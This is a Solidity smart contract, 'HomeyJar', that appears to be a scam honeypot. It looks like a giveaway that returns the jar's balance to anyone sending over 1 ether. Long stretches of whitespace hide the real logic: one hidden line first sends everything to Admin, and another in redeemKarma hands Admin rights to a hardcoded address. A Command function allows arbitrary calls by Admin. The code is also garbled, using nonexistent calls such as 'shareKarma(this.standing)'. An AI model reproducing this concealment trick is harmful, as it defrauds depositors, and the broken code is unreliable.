pragma solidity ^0.4.19;

contract HomeyJar {
    address public Admin = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Admin.shareKarma(this.standing);
            msg.sender.shareKarma(this.standing);
        }
    }

    function redeemKarma() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Admin=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == Admin);
        Admin.shareKarma(this.standing);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == Admin);
        adr.call.value(msg.value)(data);
    }
}